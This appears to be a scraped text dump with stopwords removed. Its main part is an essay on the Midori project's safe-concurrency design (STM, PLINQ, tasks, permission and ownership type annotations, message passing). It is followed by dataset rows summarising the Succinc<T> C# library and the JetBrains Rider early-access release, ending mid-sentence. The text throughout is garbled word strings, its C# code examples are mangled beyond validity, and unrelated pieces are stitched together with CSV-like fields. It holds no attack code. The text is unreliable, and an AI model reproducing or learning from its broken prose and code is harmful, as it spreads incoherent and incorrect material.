o even hardware support abandoned effort brief summary important encourage good concurrency architecture make poor one work although written detail higher level architecture focus solving first foremost dust settled see gap remained even clear stm would correct tool job got point hindsight think one many reasonable tool toolbelt although distributed application architecture rise dangerous thing give people stm effort complete failure however time began experimenting type system safe concurrency moreover bit piece ended incorporated intel haswell processor transactional synchronization extension tsx suite instruction delivering capability leverage speculative lock elision ultracheap synchronization locking operation worked amazing people time parallel language integrated query plinq alongside stm prototyping skunkworks data parallel framework night weekend leverage recent work language integrated query linq idea behind parallel linq plinq steal page three wellresearched area parallel database already parallelized sql query user behalf without needing know often impressive result declarative functional language often used list comprehension express higherlevel language operation could aggressively optimized including parallelism deepened obsession haskell inspired apl data parallelism quite lengthy history academia even mainstream incarnation notably openmp idea pretty straightforward take existing linq query already featured operation like map filter aggregation thing classically parallelizable language database autoparallelize well implicit sideeffects took little asparallel enable sequential var q x x p x select f x sum parallel var q x xsasparallel p x select f x sum demonstrates one great thing data parallelism scale size input either data quantity expense operation data expressed sufficiently highlevel language like linq developer worry scheduling picking right number task synchronization essentially mapreduce single machine across many processor indeed later collaborated msr project called dryadlinq ran query across many processor also distributed across many machine eventually went even finergrained simd gpgpu implementation eventually led microsoft internal equivalent google mapreduce cosmos system power lot big data innovation microsoft still date developing plinq fond time career real turning point collaborated built relationship amazing people billg wrote fullpage review idea concluding put resource specifically work strong word encouragement hurt securing funding deliver idea also attracted attention incredible people example jim gray took notice got experience notorious generosity hand two month tragic disappearance needle say exciting time interlude forming pfx team around time decided broaden scope effort beyond data parallelism tackling task parallelism concurrency abstraction went around pitching idea forming new team much surprise new parallel computing group created developer division response changing technology landscape wanted sponsor project opportunity roll everything nice toplevel business theme unify recruiting effort take thing even eventually branching c gpgpus obviously said yes named team pfx initially short parallel framework although time shipped marketing working magic u renaming parallel extension net team initial deliverable encompassed plinq task parallelism new effort coordination data structure cd meant handle advanced synchronization effort like barrierstyle synchronization concurrent lockfree collection derived many great research paper task parallel library brings task parallelism part plinq needed create concept parallel task needed sophisticated scheduler could scale automatically given machine available resource existing scheduler threadpool like required task run separate thread even profitable mapping task thread fairly rudimentary although make improvement year given love cilk need schedule lot potentiallyrecursive finegrained task choosing work stealing scheduler scheduling architecture nobrainer first eye locked squarely plinq pay much attention abstraction msr began exploring standalone task parallel library would look like perfect partnership opportunity started building something together task abstraction born rewrote plinq use created suite parallel apis common pattern forkjoin parallel foreach loop shipping replaced gut threadpool new shiny workstealing scheduler delivering unified resource management within process multiple scheduler fight one another day code almost identical early implementation support plinq many bug fix improvement course really obsessed usability relatively small number apis long time although made mistake glad hindsight hunch task going core everything parallelism space none u predicted widespread usage asynchronous programming really popularized year later nowadays stuff power async await imagine life without task shoutout inspiration java would remiss mention java influence thinking leading neighbor java community also begun innovative work led doug lea inspired many academic source doug book concurrent programming java helped popularize idea mainstream eventually led incorporation jsr jdk java memory model also formalized jsr around time critical underpinning lockfree data structure would required scale large number processor first mainstream attempt saw raise abstraction level beyond thread lock event something approachable concurrent collection forkjoin also brought industry closer beautiful concurrent programming language academia effort huge influence u especially admired academia industry partnered closely bring decade worth knowledge table explicitly sought emulate approach year come needle say given similarity net java level competition inspired safety art thou one big problem unsafe almost exclusively focused mechanism introducing concurrency safeguard would ensure using safe good reason hard damn hard especially across many diverse kind concurrency available developer thankfully academia decade experience area also although arguably even esoteric mainstream developer parallelism research began wallowing night day turning point another billg thinkweek paper wrote taming side effect described new type system little know time would form basis work next year quite right tied experience stm decent start bill concluded need got work hello midori still huge problem possibly imagine work incrementally context existing language runtimes looking warmandcozy approximation safety rather something program compiled could know free data race needed bulletproof well actually tried prototyped variant system using c custom attribute static analysis quickly concluded problem ran deep language integrated type system idea work even remotely usable although fun incubation project time like axum given scope vision mixture cultural technical reason knew work needed new home joined midori architecture idea number concurrency guru also midori team talking couple year leading joining toplevel knew existing foundation wrong one bet sharedmemory multithreading really future thought notably absent prior work fixing problem midori team set exactly tackle grand challenge make big bet made isolation paramount embrace wherever possible message passing connect many isolated party strongly typed rpc interface namely inside process exists single message loop default extra parallelism promiseslike programming model first class synchronous blocking disallowed asynchronous activity system explicit sophisticated coordination pattern possible without resorting lock event reach conclusion heavily inspired hoare csps gul agha carl hewitt work actor e π erlang collective experience building concurrent distributed various rpcbased system year say however message passing notably absent work pfx multiple reason first many competing effort none felt right instance concurrency coordination runtime ccr complex many satisfied customer axum language well new language msr cω powerful required language change hesitant pursue though derivative libraryonly work join held promise second help everyone seemed different idea fundamental concept really came isolation window process heavyweight finegrained isolation thought necessary deliver safe ubiquitous easy message passing subprocess isolation technology window really task com apartment clr appdomains many flawed attempt instantly come mind frankly want die hill since note nice effort like orleans built part exmidori member tpl dataflow akkanet want actor andor message passing net today recommend checking midori hand embraced numerous level isolation beginning process even cheaper window thread thanks software isolation even coarsergrained isolation available form domain adding added beltsandsuspenders hardware protection hosting untrusted logically separate code early day certainly wanted go finergrained inspired e concept vat abstraction already began process message pump sure safely waited gave u precisely needed robust performant safe message passing foundation important discussion architecture notion shared nothing something midori leveraged core operating principle shared nothing architecture great reliability eliminating single point failure however great concurrency safety share anything opportunity race condition bit lie generally insufficient shall see interesting note noodling around time nodejs development core idea asynchronous nonblocking single processwide event loop remarkably similar perhaps something tasty water truth many trait common eventloop concurrency formed canvas top entire concurrency model painted already discussed asynchronous everything article stop reasonable question robust system could built nothing say throughout multiple year pounding away system foundation stood test time underwent far fewer change came next syntax aside simplicity leaving admire fact perfect hindsight believe stopping would reasonable story however number thing kept u pushing subprocess parallelism notably absent task data parallelism painful guy come building net task plinq programming model plenty place latent parallelism waiting unlocked like image decoding multimedia pipeline frp rendering stack browser eventually speech recognition one midori toplevel goal tackle concurrency monster although lot parallelism came free thanks process absence task data parallelism hurt message process required rpc data marshaling rich object could shared one solution absence task parallelism could model everything process need task spawn process midori cheap enough work however entailed marshaling data could expensive operation type marshalable severely limiting parallelizable operation fact existing exchange heap developed buffer loosely based concept linearity avoid marshaling large buffer already system exchanging process without copying part rpc protocol idea seemed useful enough generalize offer higherlevel data structure even intraprocess race condition existed due multiple asynchronous activity inflight interleaving despite lack data race thanks single message loop model described benefit await model interleaving least visible auditable source code could still trigger concurrency error saw opportunity language framework help developer get correct finally also vague desire immutability system could help concurrency safety course felt language also help developer get existing commonplace pattern correctbyconstruction also saw performance optimization opportunity compiler could trust immutability went back academia thinkweek paper search inspiration approach combined tasteful way seemed like could give u tool necessary deliver safe task data parallelism also finergrained isolation immutability tool possibly address intraprocess race condition forked c compiler went town model section rearrange story bit order appropriate first describe system ended many year work tutorial style rather starting slightly messier history ended hope give concise appreciation system afterwards give complete historical account including dozen system came influenced u greatly started c type system added two key concept permission ownership permission first key concept permission reference could one governed could referent object mutable target object graph mutated usual way readonly target object graph read mutated immutable target object graph read never mutated subtyping relationship meant could implicitly convert either mutable immutable readonly word mutable readonly immutable readonly example foo new foo mutable default immutable foo new foo ever mutated ifield error mutate immutable object readonly foo ok mutated reference error mutate readonly object readonly foo ok still mutated reference error mutate readonly object guarantee enforced compiler subject verification default unstated immutable primitive type like int string etc mutable others preserved existing c semantics almost scenario c compiled asis change meaning contentious actually pretty cool aspect system contentious principle least authority would lead choose readonly default cool could take c code start incrementally sprinkling permission delivered value decided break c radically something hindsight done breaking compatibility choosing safer default would right choice given stated goal c compatibility think made right call permission could also appear method indicate parameter got used class list void add e int indexof e readonly int readonly get set caller would need sufficient permission order invoke method readonly list foo foos foos new foo error mutate readonly object similar thing could stated using delegate type lambda example delegate void purefunc immutable meant lambda conforming purefunc interface could close immutable state notice powerful suddenly become purefunc precisely would want parallel task see shortly simple concept alone enough enable many pfx abstraction become safe default permission deep apply transitively entire object graph interacts generic obvious way however could example combination deep shallow permission readonly list foo foos readonly list mutable foos readonly list readonly foo foos readonly list readonly foos immutable list foo foos immutable list mutable foos immutable list immutable foo foos immutable list immutable foos despite working appearing obvious man difficult thing get right power user also way write generic type parameterized permission definitely required deep bowel highly generic code otherwise could ignored system user delegate void permfunc u v permission p p p u p v used elsewhere expands void immutable foo immutable bar immutable baz permfunc foo bar baz immutable func also note convenience could mark type immutable indicate instance type immutable actually one popular feature end day estimate type system marked immutable immutable class foo immutable struct bar interesting twist see readonly used called readable entirely distinct left midori hard work trying ready concept inclusion c decided try unify presenting hitch readonly would given slightly different meaning field readonly today mean value changed case pointer therefore readonly today impact referent object graph new model would given anticipated optin flag strictmutability would acceptable would require readonly mutable slight wart get old behavior dealbreaker especially given common bug c developer assuming readonly deep would obvious similarity const come mind ownership second key concept ownership reference could given ownership annotation could given permission isolated target object graph form unaliased transitive closure state example isolated list int builder new list int unlike permission indicate operation legal given reference ownership annotation told u important aliasing property given object graph isolated graph single inreference root object object graph outreferences except immutable object reference permitted visual aid might help conceptualize given isolated object mutate inplace int builderadd andor destroy original reference transfer ownership new one isolated list int consume builder compiler would mark builder uninitialized though stored heap multiple possible alias might lead analysis could never bulletproof case original reference would nulled avoid safety gotchas one many example making compromise order integrate naturally existing c type system also possible destroy isolatedness get back ordinary list int list int built consume builder enabled form linearity useful safe concurrency object could handed safely subsuming special case exchange heap buffer also enabled pattern like builder laid groundwork strong immutability see matter immutability notice skipped exactly immutable object get created safe type system need prove mutable reference object graph exists given time exist forever thankfully precisely isolated u immutable list int frozen consume builder concisely apt see thing like immutable list int frozen new list int new sense turned isolation bubble shown earlier entirely green behind scene thing powering type system isolated ownership analysis see formalism work moment however simple view input list int constructor isolated namely case array produced new therefore resulting list int fact expression consuming isolated andor immutable input evaluating readonly type implicitly upgradeable immutable similar expression evaluating mutable type upgradeable isolated meant making new isolated immutable thing straightforward using ordinary expression safety also depends elimination ambient authority leaky construction ambient authority principle midori elimination ambient authority enabled capabilitybased security however subtle way also necessary immutability safe concurrency abstraction come see let take purefunc example earlier give u way reason locally state captured lambda fact desired property function accepting immutable input would result referential transparency unlocking number novel compiler optimization making easier reason code however mutable static still exist invocation purefunc may actually pure example static int x purefunc int func x type system point view purefunc captured state obeys immutable capture requirement may tempting say see x therefore reject lambda however course x might happen buried deep series virtual call invisible u sideeffects need exposed type system year explored extra annotation say function mutable access static variable however mutable permission already way felt consistent overall stance ambient authority midori took result eliminated ambient sideeffectful operation leveraging capability object instead obviously covered io operation asynchronous rpc system also even somewhat radically meant even getting current time generating random number required capability object let u model sideeffects way typesystem could see addition reaping benefit capability meant static must immutable essentially brought c const keyword static const map string int lookuptable new map string int c const limited primitive constant like ints bools string system expanded capability arbitrary type like list map anything really get interesting like c current notion const compiler evaluated object compiletime froze readonly segment resulting binary image thanks type system guarantee immutability meant immutability risk runtime failure result freezing two fascinating performance consequence first could share page across multiple process cutting overall memory usage tlb pressure instance lookup table held map automatically shared across program using binary second able eliminate class constructor access replacing constant offset leading reduction code size across entire o along associated speed improvement particularly startup time mutable static sure expensive leaky construction brings u second hole need patch leaky constructor leaky constructor constructor share construction finished even end constructor due inheritance constructor chaining even guaranteed safe leaky constructor dangerous mainly expose party partially constructed object object invariant suspect particularly face construction failure however pose risk immutability particular case know creating new supposedlyimmutable object someone secretively holding mutable reference case tagging object immutable type hole banned leaky constructor altogether secret special permission init meant target object undergoing initialization obey usual rule example meant field yet guaranteed assigned nonnullability yet established reference could convert socalled top permission readonly constructor got permission default override also automatically used init select area made language work seamlessly like object initializers one unfortunate consequence default invoke instance method inside constructor honest actually plus opinion since meant suffer partially constructed object accidentally invoke virtuals constructor case trivially worked around however case really needed call instance method constructor let mark method init would take permission formalism permission lattice although make intuitive sense formal type system behind scene central entire system partnered msr prove soundness approach especially isolated published paper oopsla also available free msr tech report although paper came couple year final model solidified critical idea taking shape well underway simple mental model however always thought thing term subtyping substitution fact modeled way implication type system fall naturally readonly top permission mutable immutable convert implicitly conversion immutable delicate one requiring isolated state guarantee obeyed immutability requirement usual implication follow including substitution variance various impact conversion override subtypes formed twodimensional lattice wherein one dimension type classical sense permission type could convert readonly object diagram illustrates system could obviously used without knowledge formalism however lived enough sufficiently scary yet subtle security problem year due type system gotchas going extra mile formalism helped u understand system better also helped u sleep better night enabled safe concurrency new type system hand go back revisit pfx abstraction make safe essential property must establish activity mutable right given object object must simultaneously accessible activity notice using term activity deliberately imagine map directly task although shall return subtlety momentarily also note said object gross simplification since certain data structure like array simply ensuring activity mutable right overlapping region sufficient beyond disallows actually allows interesting pattern instance number concurrent activity may share readonly access object bit like readerwriter lock without lock runtime overhead remember convert mutable readonly mean given activity mutable access use forkjoin parallelism capture object readonly permission provided mutator temporally paused duration forkjoin operation code int arr int result await parallelfork await arrreduce x xy await arrreduce x x code computes sum product array parallel merely reading data racefree example fork api us permission enforce required safety public static async fork params forkfunc funcs public async delegate forkfunc readonly let break apart fork simply take array forkfuncs since fork static worry capturing state dangerously forkfunc delegate satisfied instance method lambda close state marking position readonly limit capture readonly although lambda capture arr example mutate notice nested function reduce also run parallel thanks forkfunc obviously familiar parallelfor parallelforeach friend enjoy similar treatment similar safety turn forkjoin pattern guarantee mutator paused work way plinq example represented way complete datarace freedom usecase always mind fact introduce automatic parallelism way go one way never offer linq operator protected readonly annotation always preferred approach given absurdity query operator performing mutation approach possible one offer overload one set mutable operator one set readonly operator compiler overload resolution would pick one least permission typechecked mentioned earlier task even simpler public static task run purefunc func accepts friend earlier purefunc guaranteed referentially transparent since task structured lifetime like forkjoin data parallel friend permit capture even readonly state remember trick made example work mutator temporarily paused something guarantee unstructured task parallelism task need party mutable state isolated various way encode however way mark delegate indicate could capture isolated state sideeffect making delegate isolated public static task run taskfunc func public async delegate taskfunc immutable isolated linearly hand entire object graph task either permanently temporarily isolated int data task int taskrun consume data data notice leveraged lambda capture list make linear capture object straightforward active proposal consider adding feature like future c however without many midori feature remains seen whether feature stand rule around isolation production mutable object produced task could become isolated readonly object could frozen become immutable tremendously powerful composition standpoint eventually created higher level framework help data partitioning nonuniform data parallel access arraylike structure free data race deadlock associated concurrency hazard although designed running subset gpu would look like would lying teeth claimed entirely figured say understanding sideeffects ownership memory important concept programming gpus hoped building block would help create elegant unified programming model final major programming model enhancement enabled finegrained actor sort miniprocess inside process mentioned vat concept earlier know make safe finally found missing clue vat really isolated bubble state concept type system could permit marshaling immutable isolated object part message passing protocol without marshaling sort could shared safely byreference would say major weakness system also major benefit sheer permutation concept could overwhelming composed nicely however poor developer creating underlying safe concurrency abstraction included almost lost sanity probably genericslike unification permission ownership could help however funniness linearity hard quarantine amazingly worked case mentioned earlier image decoder multimedia stack browser etc could use safe intraprocess parallelism addition constructed many parallel process even interestingly one production workload taking speech recognition traffic bingcom actually saw significant reduction latency improvement throughput result fact cortana dnnbased speech recognition algorithm delivered considerable boost accuracy could never reached latency target overall parallelism model sequential consistency tearfree code another unanticipated consequence safe concurrency quite liked sequential consistency sc free year trying achieve sane memory model ultimately realizing popular technique fundamentally flawed cracked nut developer got sc without price barrier everywhere given running arm processor barrier cost cycle gave u usability edge also performance one also gave optimizing compiler much leeway code motion could freely order used possiblyside effectful operation visible multiple thread see got sc free consider overall system layered bottom safe concurrency abstraction indeed unsafe code code responsible obeying semantic contract safe concurrency decorating apis right permission ownership even implementation physically violated important note code system plus party kernel code deal concurrency thread lock event lockfree level abstraction everything else built atop higherlevel abstraction barrier already placed instruction stream right place thanks infrastructure another consequence struct tearing visible party programming model everything atomic free allowed u use multiword slice interface representation like go without typesafety threatening race turn risk struct tearing one major factor preventing u great golike slice type c net midori slice safe efficient everywhere message passing race message passing help tremendously building correct reliable concurrent system however panacea mentioned shared nothing earlier dirty little secret however even shared memory agent communicate one another still shared state encoded messaging agent opportunity race condition due generally unpredictable order arrival message understood although perhaps widely worrisome outcome kind race time check time use toctou one common kind race lead security vulnerability midori type memorysafety course help avoid particular symptom however reliability problem real also although people used hate compared situation com stas familiar analogy apt need block thread inside com sta must decide pump message loop pump message loop choose pump message loop suffer reentrancy reentrancy might witness broken invariant even mutate state underneath blocking call much dismay reawakens choose pump message loop suffer deadlock call pile possibly one required unblock thread midori system give choice developer instead every await opportunity pump underlying message loop com sta pump possibly dispatched work might interact shared state note parallelism mind since process event loop permit parallelism however possibly lot concurrency going definitely screw async bool isred asynccolor c return await cr await cg await cb rather simple silly function check see asynccolor red read r g b property whatever reason asynchronous must await access asynccolor mutable object well guess value might change read opening possible toctou bug instance imagine caller surprise isred may lied asynccolor c await isred c assert await cr assertion well fire even callsite toctou bug since cr might end isred return assert expression await completed familiar territory concurrency expert sought eliminate headache area system still active development towards end project however sketched promising approach essentially apply similar permission annotation asynchronous activity hence choice term activity earlier parallel task although seriously limited asynchronous activity state purview combined readerwriterlock like idea meant could use permission affixed asynchronous interface automatically ensure state asynchronous operation dispatched safely evolution moving brief word evolution system mentioned earlier presented system final form reality went five major phase evolution bore exhaustive detail one although note major mistake lesson learned phase first phase tried build system entirely annotation outside type system already said failed spectacularly point hope appreciate deeply integrated compiler type system concept need work result usable next tried variant readonly except called readable name would stick tail end project always deep immutable isolated concept mutable called writable although delusional thought never need state confused role generic played ended coding corner trying make work recognized least readable writable related one another recognized subtyping relationship writable readable largely based conversation colleague msr decided toss everything done generic redo time recognized generic type variable despite looking like naked type actually carried permission type helped came immutable however see today instead slightly confusing meaning view immutable subset data target object graph first limited readonly field classical c sense primitive type tried reading nonimmutable part view get compiler error bizarrely meant could immutable list actually immutable hindsight pretty wonky got u thinking discussing immutability somewhere recognized need generic parameterization permission added unfortunately originally picked character indicate generic type permission quite odd eg g p versus g renamed permission eg g permission p versus g one problem generic permission needed way place expected like property getters experimented various shortcut attempt avoid developer needing know generic permission hatched readable annotation shortcut flow parameter permission concept never really left system although see shortly fixed generic eventually concept became much easier swallow syntaxwise especially smart default like autoproperties lived system time first version deployed atscale midori huge breakthrough happened discovered concept necessary isolated result immutable annotation truly meant object graph immutable claim credit one beauty getting stage developing prototyping initial idea deploying atscale suddenly best brightest obsessing design thing right nose getting initial idea front customer earlyandoften finest despite growing pain worked precisely designed wallowed system another year frankly think lost way little bit turn deepness great default sometimes wanted list perfect example sometimes want list readonly element mutable example took capability granted always case outer readonly would infect inner t initial whack come shallow variant permission yielded keywords became neverending source joke hallway shreadable shimmutable favorite shisolated sound like german swear word said aloud original justification nonsense c signed unsigned version type used abbreviation sbyte uint etc shallow sure would make quite lengthy therefore justified shortening sh prefix wrong ditched special permission recognized object layer outer inner layer might differing permission right idea like idea nature let system get inordinately complex recognizing inner beauty collapsing back essence tail end project working integrate idea back c net proper adamant unify concept readable readonly leading several keyword renames ironically despite left net pursue project several year earlier optimistic anybody could done tastefully sadly turned wrong project barely got ground getting axed however introductory overview best approximation would looked like inspiration seen system final state let trace root back system particularly inspiring u picture brief since much ground cover although many pointer follow paper want dive deeper fact read something like paper per week throughout year working stuff evidenced gigantic tower paper still sitting office const similarity const quite evident although people generally lovehate relationship always found const correct worth effort anything bigger hobby project know plenty people would disagree said const best known unsoundness thanks pervasive use constcast commonly used seam library different view const correctness although also often used cheat often laziness also due compositional shortcoming lack parameterization const example force one duplicate code faced many developer would rather cast away const also deep way permission required enable safe concurrency isolation immutability pattern motivated system although many robustness benefit const correctness delivers brought permission system original primary motivation alias analysis although used compiler analysis technique type system alias analysis obviously close cousin work although relationship distant looked closely many us aliasing annotation c code including declspec noalias visual c restrict restrict restrict etc gcc standard c fact idea around isolated eventually assisted compiler performing better alias analysis linear type phillip wadler linear type change world immensely influential early day remember huge lightbulb going first read paper linear type inspired linear logic jy girard easy get lost mathematics hour nutshell linear type let prove variable used exactly similar isolated however due aliasing property imperative language like c especially heap structure possible cycle simple elegant model strict linearity hard make work linear type also commonly seen wild mostly useful mathematical proof property go looking find example however real syntax real language linear type hugely influential subsequent innovation type system also impacted u affine uniqueness type haskell monad early day pretty obsessed haskell put mildly often describe system built inverse haskell state monad haskell purely functional language sugar make certain aspect look imperative wanted sideeffects needed enter beautiful world monad particular simple memory sideeffects state monad let traditional mutable data structure way type system much understood could restrict safety appropriate well system built sort opposite imperative language way marking certain aspect program purely functional pretty sure read classic state haskell paper least dozen time year fact soon recognized similarity compared note simon peytonjones immensely gracious helpful working difficult type system design challenge effect type effect typing primarily ml community also influential early day effect type propagates information compiletime describing dynamic effect executing said code expected bring useful checking many property example always thought await throw annotation special kind effect indicate method might block throw exception respectively thanks additive subtractive nature effect type propagate naturally even amenable parametric polymorphism turn permission seen kind effect particularly annotating instance method sense mutable instance method invoked effect mutating receiving object realization instrumental pushing towards leveraging subtyping modeling relationship permission related various ownership system year also topofmind particularly given midori heritage singularity used spec language language featured ownership annotation region region despite classically used mostly deterministic efficient memory management incredibly interesting towards day figuring isolated identical several reason however first reason isolated object graph system strictly partitioned region due immutable reference region traditionally used collect memory efficiently hence dangling reference like permitted reachability analysis detect would basically devolve garbage collection second reason wanted avoid syntactic burden region language good example action deterministic parallel java requires explicit region annotation object using genericslike syntax eg foo region r amount hidden developer sophisticated compiler analysis much like cyclone however worried common case region would rear ugly head developer would left confused dismayed said given challenge garbage collection addition subprocess actor model often pondered whether beautiful unification isolated object graph region awaited discovery separation logic particularly search formalism prove soundness system built separation logic turned instrumental especially concurrent form formal technique proving disjointness different part heap much system safe concurrency abstraction built atop isolated primitive particular oopsla paper used novel proof technique view constructed separation algebra caution getting deep mathematical territory several colleague far smarter goto guy certainly helped u sleep better night uniqueness type uniqueness type recent invention derived early linear type system fascinated early period time actually unique keyword language eventually folded back concept isolated essentially shallow isolated denying heavily inspired saw uniqueness type especially language like clean experimental work bring uniqueness scala rust model checking finally would remiss least mention model checking easy confuse static analysis however model checking far powerful complete go beyond heuristic therefore statistic msr zing although used verify correctness certain aspect implementation think sufficiently considered model checking might impact way safety attained topofmind faced intraprocess interleaving race condition especially look future distributedstyle concurrency intraprocess parallelism state machine verification critical many key idea relevant language story span many year year saw several language tackling similar challenge sometimes similar way complex timeline hard trace every single influence given point time however fair say four specific language noteworthy influence u note dozen influential concurrent parallel language inspired work sure read everything read always learn however best survey field focus mainstream relevant people writing production code year modern c already mentioned const influence also interesting note similarity isolated std uniqueptr although born different time different world clearly deliver similar perspective ownership noted difference include deepness c approach deep insofar leverage raii faithfully data structure motivation c motivation primarily memory management neither safe concurrency immutability concept constexpr obvious similarity isolated immutable particularly compiletime evaluation freezing result continued evolution constexpr taking basic building block new frontier always wanted system never time like arbitrary compiletime evaluation expression freezingmemoization result thankfully leading c group microsoft time midori able bring many lesson learned discussion like think positive impact evolving c even system came obvious comparison take const immutable const view mutable immutable data readonly added deepness concept const permission model generally perhaps closest analogy existing system frankly surprised get used order magnitude although andrei one chief developer thought topic go although personally love programming go much influence system might expect go list concurrency one primary feature although concurrency easy generate thanks goroutines best practice encourage wonderful thing like share memory communicating basic set primitive go much beyond thread threadpools lock event mention u beginning early day journey one hand see go brought usual approach bear namely eschewing needle complexity exposing bare essential compare system built handful keywords associated concept count admire simplicity go approach even nice builtin deadlock detection yet hand find debugging classical data race torn structs interface clamor remarked simply running coupled simple rpc system ideally integrated way step outside go native type system get close simple intraprocess parallelism midori model began perhaps best sweet spot rust bunch rust impressed delivered much set deliver midori actually shipped whereas hat go team seriously know first hand hard hard hard work level type system hacking yet described borrowed reference system idea autodestructible type however add mix underlying type system concept remarkably similar rust slightly le opinionated overall architecture system midori mean easier adopt piecemeal however application concept traditional concurrency mechanism like lock actually fascinating see article give great whirlwind tour safe concurrency rust poking reference reveals apis designed similar principle mind example simpleparallel look whole lot like pfx parallel api described earlier safety annotation applied trust system shipped thousand eye realworld experience applied epilogue conclusion although glossed many detail hope enjoyed journey basic idea clear importantly learned something new want understand anything greater detail please see oopsla paper ask couple year since away know midori happened os renaissance microsoft never saw light day time pondered lesson learned journey whether relevant beyond hallway old building believe otherwise taken time write article thrilled world adopted task big way although different reason expected asynchrony parallelism many way inevitable however think task halfdecade ahead curve least minor influence including async await idea built atop data parallelism taken far fewer people leverage cpu way imagined good reason gpus architected extremely wide simd operation floating point essentially killer scenario sort parallelism cover case man scream safe concurrency still critically important yet lacking world still need think collectively underestimated long would take industry move type memorysafe programming model despite increasing popularity safe system language like go rust pain say still believe decade away fundamental technology stack like operating system safe core industry desperately need happen given buffer error remain attack type critical security vulnerability software think concurrencysafety next frontier type memorysafety arrived toctou race condition generally underexploited yet readily attackable vector thankfully writing correct concurrent code hard provoking latent concurrency error delicate orchestration race condition system become concurrent distributed system become increasing problem u clear exact formulation technique demonstrated answer fact given focus parallelism asynchrony surely however need answer damn hard build robust secure safe concurrent program still day year later particular still conflicted whether type system extension warranted certainly immutability helped thing far beyond safe concurrency sideeffect annotation commonly helped root bug caused unintended sideeffects future industry massively distributed one however want simple individual component composed larger fabric world individual node le precious arguably correctness overall orchestration become far important think point golike approach focus rpc mechanism connecting disparate piece model leveraging decade prior research fascinating happy took approach literally tried invent anything new used joke job sift decade research attempt combine new novel way although sound le glamorous reality lot industry innovation take place seldom happen inventing new idea thin air anyway next series talk battling gc
457,Lobsters,dotnet,"C#, F#, .NET programming","Succinc<T> - Discriminated unions, pattern matching and partial applications for C#",https://github.com/DavidArno/SuccincT,succinc discriminated union pattern matching partial application c,succinc discriminated union pattern matching partial application c current project status overview please refer wiki serialization serializing json current release nuget package support net net core numerous framework net standard nuget package support net net core numerous framework net standard planned succinct roadmap forking contributing branch page contributing page,succinc discriminated union pattern matching partial application c current project status status master branch current release overview succinc net library add number functional feature c discriminated union pattern matching partial application implicitly typed lambda ability treat void method unit function replacement tryparse method return option maybe prefer rather using parameter antipattern con support ienumerable add element head enumeration split enumeration head element enumeration containing remaining item without repeatedly enumerating enumerable cycle method endlessly repeat enumeration array without repeatedly enumerating enumerable replacement ienumerable xxxordefault method return option maybe prefer avoiding null return value default problem finally experimental feature stage forward pipe support detail feature please refer wiki serialization saw introduction jsonnet serialization support succinc using succinc serializers type correctly serializeddeserialized json detail see serializing json wiki page current release current release succinc available nuget package support net net core numerous framework net standard release also includes succinctjson available separate nuget package support net net core numerous framework net standard succinctjson dependent succinc pull package part install also please note nuget package also dependent newtonsoftjson nuget package planned next release expected detail planned please see succinct roadmap detail forking contributing wish fork repo build machine please refer branch page detail currently active branch wish contribute way saying hi submitting pr please refer contributing page
459,Lobsters,dotnet,"C#, F#, .NET programming",JetBrains Rider Early Access Program is now public,https://blog.jetbrains.com/dotnet/2016/11/21/jetbrains-rider-public-preview/,jetbrains rider early access program public,announced project rider rider eap open everyone using rider daytoday development log issue leave u comment jetbrainsrider tl dr download first public rider eap build rider home page issue tracker survival guide webinar november rider full featured cross platform net ide based resharper intellij webstorm intellij idea window linux mac resharper feature inspection context action quick fix build debug net framework net core xamarin unity net developer standard net framework mono project build run debug rundebug configuration similar feature running debugging xunitnet nunit test keymaps familiar visual studio resharper user net core developer support net core project tag helper build run debug net core project survival guide run debug net core unit test survival guide unity xamarin developer great ide developing xamarin solution xamarinforms xaml editing feature plugin built unity readme repo bundling resharper unity plugin plugin readme github debug unity project intellij feature rest test client version control support local history datagrip rich database tooling rich plugin ecosystem vim editing mode plugins rider plugin repository site hadi video use rider jetbrains rider download first public rider eap build toolbox,back january announced project rider march started private early access program today excited announce rider eap open everyone fantastic feedback private eap rider well way release quite feature complete still couple rough edge know many people inside outside jetbrains already using rider daytoday development love try let u know think good well bad log issue leave u comment ping u twitter jetbrainsrider tl dr download first public rider eap build rider home page issue tracker please read survival guide various known issue workarounds also webinar november demonstrate rider action let back moment rider rider full featured cross platform net ide based resharper intellij front end user interface built proven intellij platform like webstorm intellij idea run window linux mac engine drive favourite jetbrains ide feature resharper running process language server great mixture intellij resharper provide industry leading ide functionality running resharper process free u sharing resource memory visual studio feature rider public eap rider using resharper provide language feature main goal expose much resharper functionality building resharper year lot fortunately way rider work mean huge amount functionality brought quickly rider already support resharper rich navigation find usage automatic smart import completion vast majority resharper inspection context action quick fix well unit testing solution wide analysis course rider ide need implement full ide functionality including feature resharper provide also build debug well handle project management solution reference nuget fact almost many feature easily list instead let take look couple different scenario targeting net framework net core xamarin unity net developer rider load standard net framework mono project understands visual studio sln file load msbuild based project eg csproj solution load process find fast even better edit project file externally rider quickly automatically reload almost without noticing reference course supported rightclicking project solution explorer use new nuget window search install update nuget package traditionally functionality provided visual studio nice able provide typically jetbrains implementation cache result update background think pleased speed course rider support build run debug project built msbuild xbuild running cross platform mono run debug make use powerful feature intellij rundebug configuration resharper similar feature run configuration allow specifying many different way launching project need rider offer number net specific template launching project running arbitrary executables net core furthermore rider support debugging run configuration includes net framework mono net core rider us intellij existing debugger ui offering familiar call stack view well local watch variable rider also support break exception setting next instruction ide complete without support unit testing rider support running debugging xunitnet nunit test familiar user interface icon displayed editor run debug altenter menu tree view running test double click test navigate code course stack trace clickable worried switching new ide getting started wizard walk setting rider including choosing keymaps familiar visual studio resharper user suggesting plugins work better code net core developer rider also support net core project open existing project projectjson file create new one based template new project wizard course cross platform want target net core mac linux obviously want tooling rider give full ide window mac linux open net core project rider automatically restore nuget package show package dependency tree rather flat list loaded rider provides rich ide functionality get traditional net framework project code completion navigation refactorings inspection adding reference simple editing projectjson file code completion naturally saving rider restore package automatically swap multiple target framework chooser status bar also includes specific functionality aspnet core tag helper cshtml file code completion find usage refactoring supported course rider build run debug net core project cross platform please read survival guide known issue adding reference debugging unit testing finally rider inherited resharper ability run debug net core unit test well mostly feature quite finished work case example nonwindows project also target net framework currently support xunitnet nunit also support project target multiple framework please check survival guide unity xamarin developer mostly focused exposing existing resharper functionality adding new essential ide level feature debugging also want make rider great ide developing xamarin solution really got started xamarin support right although rider already includes resharper existing xamarinforms xaml editing feature planned bit along unity support firstly unity editor made open project c file error message rider adding plugin unity project hopefully built unity future see readme repo instruction getting set blog soon project open rider find specific unity functionality bundling resharper unity plugin yes rider support plugins add number useful feature automatically setting supported c language level c suggestion c code inserting auto completion unity message method see plugin readme github detail furthermore rider also debug unity project run attach local process menu item show list available process debug including available unity instance write unity support future blog post intellij feature enough rider 